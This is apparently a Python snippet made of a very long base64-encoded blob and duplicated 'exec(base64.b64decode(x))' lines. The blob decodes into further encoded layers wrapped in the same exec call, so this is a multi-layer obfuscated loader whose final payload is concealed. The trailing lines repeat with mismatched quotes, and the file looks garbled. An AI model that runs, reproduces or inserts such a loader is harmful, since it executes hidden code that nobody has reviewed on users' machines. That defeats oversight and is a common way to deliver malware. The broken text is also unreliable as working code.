Qk1XWHBHZDFOSFJrWk9WbVJvVFZkME5GWnRlRk5TTWtsNVUxaHNVMkpIVWxWWmJYaExZekZXZEUxV1RscFdiWGg1VmpJMWExUnJNVmhsU0doV1lsUkdTRmxYZUdGamJVNUpZa1pvYUUxc1NqWlhWbHBoVTIxV2RGSnJaR2xTYlZKUFZtcEtibVZzV2xkVmEyUnFUVlp3ZVZSV1dtdFhSMHBJVlcwNVdsZElRbGhaVlZwaFpFZFdTRkpzY0ZkaVJYQkpWbXBKTVZJeFZYbFNXSEJXWW10YVdGbFhkRXROTVZaeFVtNWtVMkpIVWpCVmJURnZWVEZhUmxkdFJsZFdiVkV3VlZSR1dtUXdNVmxXYkVwb1RXMW9iMVpYZEZka01WcEhWbTVTYW1Wc1dsaFVWM1IzVTFac2NsZHJPVmhTYTNCWFdUQmFZVll5UlhoalNFWlZWbTFTVEZwRldsZFhWMFpIWVVab1UwMXRhR0ZXTVdRMFlqRlZlVk5ZYUZaaVIyaHlWVEJrVTFaR1VsZGFSRkpzVm14d01GUlZVbGRoUmtwelkwaHNWV0pHV25aV2FrRjRaRlpXV1ZwR1pHbFdSVnBKVjFSSmVGTXdOWE5TYms1WFlrZFNXRmx0ZEV0T1ZscDBUVmhrVTAxc1JqUldSM1J2Vm0xRmVXRklRbFppV0UxNFZrUkdWMk5zV25OWGJYaFhZa2hDTlZacVNqUmhNVmw1VW1wYVUySkhhRmRVVnpWVFpHeGFWVk5yZEZOTmF6VklWbGQ0ZDJGV1NuSmpSbXhYWWxob2FGZFdaRTVsUm1SelZteE9hVkpZUWxCV2JYQkhVekExUjFkc1pGcGxhMXBXVkZaYVYwNUdWWGxPVlhSWVVqQndTVnBWV25OWGJGcEdZMFpTVmsxR2NIcFdha1pyWkVaS2MxVnNUazVXVjNRMVZteGplRTVHYkZkVmJrNVlZbXMxY1ZVd1pEUlhSbEpYVjI1a1YwMVlRbGRXTWpFd1ZUQXhWMk5FUmxaTmFrWjZWbFJLUzFZeFRuVmFSbWhYVFRKb01sZFhjRXRUYlZaSFdraFdWV0pHY0c5VVZWSlhWbXhhUjFwRVVsTk5SRlpJV1d0b1MyRkdTbkpPVnpsWFlsaFNNMVpxUmxOak1rWkdWR3hrVG1FeGNEVldha293VGtaWmQwMVlWbWhTTW1oWVZGVmtVMVZHVm5SbFNHUlVVakJhU1ZscldtdFhSa3BXWTBkR1YySlVSak5WZWtwU1pVZEtSMXBHYUdsU2JrSlFWbXBDWVZNeFduTmlSbWhxWld0YVdGUldhRU5YVm5CR1ZtcENhVkl3Y0VoV01qVnpWakF4ZFZWdVNsZE5SbkJNV2taYVIyTnNjRWRqUlRWVFltdEtUbFp0ZEd0T1JrMTRWMWhzVldFeFdsUlphMlJUVjBaV2MxZHVaRmhXYkhCNVZsZDBhMVV3TVhKTlZGWldUVmRvTTFkV1drcGxWMVpIVld4a2FWZEdTWHBXYlhSaFdWZFNTRlJyV210U2JIQlBXVlJLTTAxR1duRlRWRVpYVFd0YWVsVXllRzlXYlVweVUyeGFWMkpVUmxSV2ExcDNWbXhrYzFkdGVGZE5WbkJLVjJ0V1lXUXhXWGROVld4U1lrZG9XVlpyVmt0V1JsWlZVbTFHYTFKck5YcFdiWGhyWVZaS2NtTkdjRmRpVkVVd1drUkdXbVZIVGtaV2JFNW9UVEZLV1ZadE1UUmtNbFp6VjJ4b2JGSXpVbGhVVlZKSFZqRnJkMkZIUmxkTmExWTBXVEJrYjFkc1drWlhiR1JoVmxad1ZGbDZSbmRTTWtaSVlrZHNVMkpyU1hwV2JYaHJaREZGZUdKR1pHRlNiVkpZV1cxek1WWXhiSEphUms1cVZteGFNRnBWYUU5VU1WcHpVMnhrVjFZelVuSldha0Y0VWxaS2NsZHNXbWxYUmtvMlZtMXdSMWR0Vm5SU2EyeHFVbTFTYjFSWGVFdFVWbHB4VW0xMFUwMVZiRFZXUjNScldWWktkRlZ1UWxaaVIyaEVWVzE0WVdSSFVrZGFSbkJYWWtWWk1GWnFTVEZVTVZwMFUyNUthbEpzV21GWmExcGhZVVphUlZKc1pHcFdiRW93VkRGYVQyRldTblZSYkd4WFlXdHNORlJWWkVkU2F6RlhWMnM1V0ZORlNsaFhWM1JyWWpKT2MxZHNWbFJoTTFKWVZtMTRkMlZzV25SbFIzUm9WbXR3ZWxadGNGTldNVnB6VTJ0b1dsWkZjRkJXYWtaVFpGWlNjMVp0YkZOaE0wSmFWakZhYjJReFdYZE9WV1JZWW14S1QxWnJXa3RWTVZKWFdrUlNXRlpzY0RCVWJGWXdWakZKZDFkVVNsWmlXR2h5Vm14YVlXTXlUa2hoUm1SWFZtNUNXVlpxUW10V01VNVhXa2hTYTFKVVZtOVVWRUpMVTFaYWRHVkhkRTlTYXpFMFZqRm9hMVJzWkVaT1ZsWmFWa1UxZGxZd1dtRmtSMVpHWkVaT1UySkdjRFJXVkVvd1RVZEdjazFXWkZSaWJrSllWRmMxYjFkR2JGWldXR2hVVm10YU1GUXhXbXRWTWtwSFkwaHNWMUl6VW1oVmVrWmFaVVprZFZSdFJsTk5SbkJWVmtaU1IxTXhXbk5hUm1oclVtMVNjVlJWVWxkVFJteHlZVVZrVjFZd2NGWlphMlJIVmpKS1dWVnFUbGROVm5CNlZtMTRhMlJGT1ZkalJtUnBVMFZKTWxZeFVrTlZNVkY0VjFoc1UxZEhhRmhXTUdSdlYwWlNWMXBHVGxWU2JGWXpWakowTUdGck1YSlhhMmhYVWpOb2NsWlVTa1psVjFKRlZHeGthVmRGU2tsWFZsSkNaVVpPUjFSc2JHaFNiVkp3V1d0V2QxWnNXbkZSYlhSV1RXczFlbFp0TlZOaE1VNUlWV3hhVlZac2NHaGFWM2h6Vm14a2NrOVdaRk5XUlZwWlZtcEtORmxXV25OWFdIQldZbXR3WVZadE1WTlVSbFowWTNwR1YwMVlRa2hYYTFwUFZHc3hWbU5GTlZkaGExcG9WbTB4VjFJeFVuSmhSbVJvVFZoQ1dWZFhkR0ZrTVdSSFlraE9XR0V6VW5OV2JYaDNWbXhWZVdOR1RsWk5hM0JZVlcxd1UxWnJNWEZXYkZKWFVrVmFhRmw2Ums5ak1rWkhXa2RzVTJFelFscFdiR1F3V1Zaa2RGWnNhRlZoTVhCV1dXeG9RMVF4V25OVmJHUllWbXh3V1ZSVlVrZFdNREZ5VjJ4b1ZrMVhhSHBaVlZwTFpFZEdTR0ZHWkdoaGVsWXlWbXBDWVZVeFdsZFRiazVoVWxSc2NGVnNXblprTVdSeVZtMUdhVTFyV2xoV01uaHJZV3hLZEdWR2JGZGlXR2hvVmpCYVlXTldTbk5hUjNCT1YwVktTRmRYZEdGVE1rWklWbTVTYkZKdFVsaFpiRkpEVGtac2NWSnNaRk5OVmxveFZsY3hORlV5UmpaV2JIQlhWak5vVkZWcVJrOWpNa3BIVjJ4b2FWWkhlRmhXUm1Rd1pERmtjMkpHV2xoaWJWSlpWVzE0YzA1c1dsaGxSazVYWWtad1IxWXllRU5YYlZaeVYyeENWMDFYVWtoVk1HUlBVakZTYzFSc2FGTldXRUl5Vm0weE1GbFhSblJXYTFwUFZsZFNWVmxVU2xOV01XeHlWMjVrYUZKc1ducFhhMXBQVmpGYWMxZHFRbUZXVjJoeVZqQmFZV1JHVm5WaVJtaG9UVzFvZVZadGVHdFRNVnAwVkd0a2FsSnRhRzlVVmxaM1ZWWmFkR05GU214U01VcFpWVzEwYTFWdFNrZGpSbWhXWWtaYVlWUlZXbUZXVmtaMFVteFdUbUY2VmxsV2Fra3hWREZhU0ZOc2FHeFNiV2hXVm10V2QyUnNjRWhsUjBaclVqRmFTRlpIZUV0VWJGcFZVbGh3VjFKc2NIWldSRVp6VmpGU2NscEdVbWhsYlhoWlYxZDRVMVl4U2tkaE0yeHNVakJhY1ZSV2FFTlNiRnBZVFZSQ1ZXSkdiRFpaVlZwclZqRmFjMk5HVWxaaGExcFhXbFZhVDFkV2NFZGhSMnhUVFZWd1dWWXhaRFJWTVVaMFZtdGtXR0pyY0ZsWmJGWmhWMFpzV1dOR1pGZE5WbkJKV2xWak5XRkdTWGRXYWs1YVRVWkthRlpxUmxwbGJGWjBZVVphYUdFeGNIbFdWM0JMVkRGS2MxcElVbXBTYXpWdlZGUkNTMVZXV25OYVJGSmFWakZHTTFSV1dtdFhSMHBIVjJ4U1dtRXlVbFJaYWtaVFZqRmtkVlJyTlU1V2EzQTJWbTB3ZUUxSFJrZFRiRlpTWVd4YWFGWnNXbmRrYkZsNVRWVjBWMVpyY0hwV1YzaDNWRzFLZEdGR2JGZGlXR2hvVldwS1QyUkdWbkphUmxab1pXeGFXbFpYZUZka01XUlhWMjVHVkdGclNsaFpXSEJYVjFaV2RHVkhkRmRTYlZKSlZsZDRRMVl5U2toaFJWSlhUVVp3YUZwR1pFOVNNWEJIVkd4T2FWZEhhRnBXYlRFMFlqSkplVkp1VGxoaWF6VlpXVmQwUzFac2JISlhibVJyWWtad2VGVXlkREJYUmtsM1YydG9WbFl6YUhKV1J6RkxZMnhPY21KR2FHaE5WWEJKVmpGYVlXRXhTWGhWYms1cFVqQmFWRlpyWkRSWFZscDBUVlJDYTAxc1NucFdNalZUWWtaS2RGVnRSbGRoYTFwTVZqQmFZV015UmtoUFZtUk9ZVEZyZVZkWGRHRlVNV1IwVWxoc1ZWWkZXbFpXYTFaaFpXeHJlV1ZIUm1wTlZrcDZWakl4YzFVeVNsbFpNMmhYWWxob2NsUlZWWGhTTVdSMVZHeG9hRTFZUWxaWFZsSkxZakZzVjJKSVRtaFNlbXhYVlcxNGQwMUdjRlpYYXpsb1lsVndSMVJzVWtOV2JVcFpWRmhvVjFaRlJqTmFWbVJIVW14d1IxcEhiRk5pYTBvMFZtdGFZV0V4U25SV2JHUlVZbXhhVjFscldrdGpSbFp4VTIwNWJHSkdjRmxhUlZwclYyeFpkMWRyYUZkaVZGWlFWbXBHWVZKc1pIVlRiSEJvVFd4RmQxZHNaRFJaVjFKR1RsWmFVRll5YUc5YVYzUmhUbXhhV0UxWVpGcFdiVkpKVld4b2IxWXhaRWhoUjBaYVZrVndWRlV3V2xOa1IxWklVbTEwVjJFeGNEWldNblJoVkRKR1YxZFliR0ZTUm5CWVdXdGtVMDB4VmpaU2JGcHNVbXMxV2xsVldsZGhWMFkyVm01a1YxWjZSVEJWZWtwUFVqSktTVlJ0YUZObGJYaDVWa1phWVdReFRrZFhiR2hyVWxSc2IxbFljRWRsVmxKelZtMDVWMDFWY0RCWlZXaGhWakZhUmxkdVNsWk5SbkJZV1hwR1lXTXhXbk5hUm1ST1ZsWlplbFp0ZUd0T1JteFhWMWhvV0ZkSGFIRlZiR1J2WTJ4V2RHVkZkR3BTYkZwNlZqSjRkMkpIU2tkalJteFZWbGRvY2xaSGVHRmpNazVHWVVaa1RtSnRhRzlXYTFKSFdWWmFjazVXWkdsU2JrSllWRlJHUzFSV1pITmFSRkpYVFdzMWVsZHJhRXRaVmtwMFlVWlNXbUpZVWt4Vk1GcHJWbFpHZEZKc1VrNVdhM0EyVmxSS05HRXlSbk5UYTFwWVlrZG9XRmxVUm1GaFJsbDNWMnhrYTFKVVJsaFZNakUwVlRKS1JtTkhSbGROYmxKeVdYcEdWbVZHWkhWVGJYQlRZa1Z3V1ZkWGVHOVJNVkpIVjJ4V1UyRjZWbk5WYlhoM1pXeGFkR1ZGZEdoU1ZFWjZWVEkxYTFkR1dYcFZiR1JWVm14d1lWcFZXbXRqYlVaSVpFWk9XRkpyY0c5V2JURTBWVEZKZUZSc1pHcFNiSEJZV1d0a1UxZEdiSEpYYm1ST1VteHdXVlJzVmpCV01rWTJVbXBHV2xaV1duSlhWbHBMVW14a2NtVkhSbE5XYkZZMFZtMXdSMVl5VFhoalJXUmhVbFJXY0ZacVNtOVRSbHAwWTBWMFQxSnRlRmxWYkdodlZrWmtTR0ZIYUZaaVJuQXpWbFZhWVdSSFZraFNiRnBPVmpOb05WWXlkRk5WTVZwV1RWWm9iRkp0ZUdoVmJHUlRVMFpzY2xwRmRGUlNiRnA2V1RCYWQxUnNTbk5XV0doWFlsaG9WMXBWWkU5ak1YQkpVMjFvVTJKclNuWlhWbWgzVmpBMWMxZHVVbXBTV0ZKVlZGWmFjMDVXV2toa1NFNVhVakJ3U0ZZeWVHOVpWbGw2Vld4b1ZXSllhSEpaTW5oWFkyeHdTR05GTlZkaWEwa3lWbXBLTUZsV1dYaFhXR3hVWWtkNFUxbHJXa3RXYkZweldrYzVVazFZUWxkV01qRkhZV3N4V0dSRVdscFdWbFV4VmxSQmVGSXlTWHBhUm1SWFVsZDBORlpyVWt0U01rMTRWRzVHV0dKWGVGUlVWVnAzWVVaYWRHUkdaRk5pVmxwSVdUQldiMkpHVGtaT1dFWlZWbXh3TTFSV1dtRlRSVEZaV2taV2FWWllRa2hXYWtaVFV6RlpkMDFZVmxaaVIxSldWbTB4VTFSR1ZYZFhhM1JxVm0xU2VsZHJaSE5oUlRGSlVXeHdWMkpIVGpOYVZXUktaREF4U1dGR1pHaGlTRUpXVjFkMFZrMVdXa2RWYkdSaFVtczFjMVp0TVRSV01WbDVZM3BXYUZKc2JETlpNRnAzVjJ4YVdGUlVSbGRoYTFwTVdrVmFWMVpXUm5OYVJUVm9ZVEZ3VlZZeWVGZFpWbGw0V2tab1ZHRXlhSE5WYlhNeFZrWmFjbGR0Ums5V2JIQjVWako0YTFack1WWmpTR3hWVm0xb1VGWXdaRVpsVjBaR1QxWmthVkl5YUZWV2JURTBZekpOZUZwSVVsTmhlbFpVV1d0b1ExZHNaRlZSYkdSVlRWWnNORlV5TlU5aGJFcDBaVVpzV2xZelRYaFpNbmhoWXpGa2RGSnRkRk5pUm5BMVZrUkdhMUl4V1hsVGEyeFNZbFJzV1ZsVVJuZGpiRlkyVW1zNVZGSnJOWGxaVldSelZUSktWMU5zYkZoV00yaFVXVEl4VjJNeFpIVlZiWEJUVjBaS1VWWlhjRU5rTURGSFYyeGthRko2Ykc5V2JGSkRUbFpzVmxsNlZsZGlWWEJJV1RCa2IxWXhXa1pYYlVaaFVrVndTRlZ0ZUZOak1WcHlUbFprYUUwd1NtRldha1poVmpGYWNrNVdaRlpYUjNoVldWUktVMVpXYkhKYVJGSlhZa1p3ZWxkcll6VmhNa3BJWlVaYVZsWnRhSFpaVnpGTFZtMU9SbGRzWkU1aWJXaHZWbXRqZUZNeVRuTlVia3BYWWtkU2NGVnRlSGRsVmxwWlkwVmtWVTFXYkRWV1IzUmhWakpLUjFkdVFsWmlXR2d6VmpKNFlWWldSbk5hUmxKT1ZteHdXVlpxUm05aU1XeFhWR3RzVW1Kck5WZFphMXBMVjBad1dHVklTbXROVm5BeFZrZDRhMkZXV2xkWFZFcFhWbTFSTUZacVJtRmphekZXV2tkd1UxZEdTbTlXYlhCUFlqSk9jMWRZWkdGU1ZHeFVXVmh3YzFkR1dsaGpla1pXVFZWd1dGa3dWakJXTWtwWlVXdDRWV0V4Y0ZkYVZWcHJZMnh3U0ZKc1RsZGlhMHBTVm0weE5HSXhWWGhYV0docFVteGFWRmxzVm1GV1ZsWjBaVVYwV0ZKc2JEVmFWVlUxVmpBeGNtTkZhRlpOYWxaMlZtcEdTMDVzU25KaFJtUlRUVEpvVFZaWE1UUmhNazE0WTBWa1lWSnRVbkJWTUZaS1pWWlplRmRzVGxOTlZsWTFWa1pvYjFaWFNuSmpSbXhhWVRGVmVGbHFSbk5YVjA1SFdrWmtUbFp1UVhkWGJGWnJVakZhUmsxV1dsZGhiRXBoVkZWYVlWZEdXbGhsUjNSVVVqQmFTRlpYZUd0aFZtUkhVMjA1VjJGcmJ6QlpWRXBQWXpGa2MxWnNUbWxTYmtKUVZtMTRiMUV4WkVkWGJrWlRZbFJzY2xSV1duTk9SbFY1VGxVNVdGSXdjRWhWTW5oclZqSktkVkZyYUZkV1JWb3pWV3hhUjFkWFJrZGFSMnhUWW10Sk1sWnNVa3RPUjBsNFZsaGtUbFpzY0hGVmJYUmhWMFpzY2xwR1NtdE5WbkI0VlcxMGQyRXdNVVZTYTNCYVZsWndhRmxXV2t0a1ZrWnpZVVpvVjJKRmNFVlhhMUpMVkRKTmVGWnVUbGhpUm5CdlZGZDRTMVpXV25STlNHaFBVbXh3ZWxadGVHdFdiVVY1Vld4a1ZWWnNXak5VVmxwWFZqRldjbVJHWkdsU2JYY3lWbXhhVTFFeFdYZE5XRlpvVWpKb2FGVnNXbmRYUm5CR1YydDBhazFyV2tsWlZXUnZWR3hrUmxKcVVsZGhhMjh3Vm1wR1lXTnJOVmRhUjBaVFlsWktXbGRYTVhwTlYwNVhWbTVTVGxack5YRlVWbVEwVm14V2RFNVhkRlZOYTNCSVdUQm9iMVpzV1hwaFJrSlhWa1Z3U0ZSdGVHRmpiVVpIWTBkb2FHVnNXWGxXYlhocVpVWk5lRk5ZYUdGVFJYQlJWbTE0ZDJJeGJGVlVhMDVYVm14d1dsa3dWbXRoYXpGeVRsaHdWMkpVVmxoV2JHUkxWMGRXUjJGR2NHbFNNbWd5VmtjeE5GZHRWbGhWYTJSaFVqSm9UMWxVUm5kT2JGcFZVbTA1YUUxclducFdSM1J6VlcxS1IyTkdXbGRpVkVaVVZtdGFjMVpzWkhOWGJYaFhWa1ZhV0ZZeWRHdE5SbFY0VjJ0b2JGSnRhRmhWYTFaaFlVWldObEpzVG10U2F6VjZXV3RrYjFVeFduSmpSbXhYVW0xTmVGVlVSa3RTTWtwRlYyeE9hRTB4U2xWV1JscFhaREF4VjFkdVVteFNNRnB2Vm0xek1WSXhWWGxsU0U1WFRWVndNRlpHYUc5WGJVcFZVbXhvVm1GcldtaFpNVnByWXpGT2RHRkhlR2xYUjJjd1ZtcEdhMDFHYkZkVVdHeFhZa2RTV1ZsVVNtOVVNVlp5Vm0xR1YwMVdjREJhVldoclZUSktSMWRzYkZWaVJscFFWbXBHUzFaV1NuTmFSbVJPWW10S1VWWnFTWGhTYlZaWFZtNU9hRkpzY0U5VmJUVkRZakZrY2xadGRGVk5WWEF3Vm0xMGExWlhSalpXYkZaV1lrWmFNbHBXV21GalZrcDBUMWQwVGxaVVJUQldha2t4VXpGU2MxcEZXbXBTYTBwWVdXdGFkMVJHV2xaWGJVWnFWbXMxZUZaWGVHRlZNa3BaWVVad1dHSkdXbGhVVldSSFpFWk9jbUZHV21saWEwcGFWMVpTUjFack1WZGlSbFpVWVROU1ZWWnRkR0ZsVm14eVYyMTBhRlpyYkROVVZXaHZWMFpaZWxWdGFGWmlWRVpZVmpCYVYyTnRTa2hTYkU1WVVsVndNbFp0TVhkVU1WVjRWV3hrV0ZkSGVITlZibkJ6WTBaU1dHUklaRlJTYlhoNVZsZDRhMkZHU25KaVJGWmhWbGRTU0ZacVFYaFNNVnBaWVVad2JHRXhjRlZYYTFaclZERkplRlJ1VW10U2JWSndWakJrYmsxR1duUmpSV1JXVFZWV05GbHJXbXRXUm1SSVlVWnNXbUpZVW1oWFZscHpWMGRTU1ZwR1pGTmlXR2cxVm0weGQxRXhXa2RYYmxKUVZrWndWMVpxVGxKTlJscDBaVWRHVTFacldsWldiWGhUVmpBeGRXRkVWbGRYU0VKSVdrUkdhMWRHU25KaFIzaFRZbXRLZWxadGNFdGlNbEY0VjFob1dHSlViRlpVVjNSM1VqRlNjMkZGWkZkaVIxSklWakl4UjFkc1dYcGhTR3hoVWtWYWNsa3llSGRTTVhCSVlVZHNWMVl6WTNoV2JYaHFaVVUxUjFWclpGVmhNbWhvVlRCa1UxWldVbGRXYkZwUFZteGFTRlpIZEhkaGJFcFdUbFJDVjJKWVFsUlhWbHBhWkRBeFdWZHNhRmRsYTFwSlYyeGtOR1F4V2xkYVJsWlNZWHBHY0Zac1pEQk9WbHBJWkVkMFZrMXJjRWhaVkU1elZVWlplbFZ0YUZkV1JYQjFWRlZhVG1WR1VuVlRiRVpXVFVkNE0xVlVTWGhXTURWSFkwWm9WVlo2YkdGWmJGWmhUbXhrYzFWc2NFNVNXR2d3VlRGU1MxUXhTWGhUYms1WVZrVnJNVmxVUm5kV1IwWkZWV3Q0VmsxdVRUVlRWMnh5VXpGd1dXRkhlRnBsVjJod1YxWm9UMkpGTlhGVldGWmFZV3hyZDFkclpGZGhiVWw1VlcxNFRGTkhaSGRUTVVVNVVGTkpjRU50VmpSYVYwMXZXVzFHZWxwVVdUQk1iVWt5VGtkU2JGa3lPV3RhVTJnMFMxTnJQU0lwQ21WNFpXTW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaDRLU2s9IikKZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHgpKQ==")
exec(base64.b64decode(x))")
exec(base64.b64decode(x))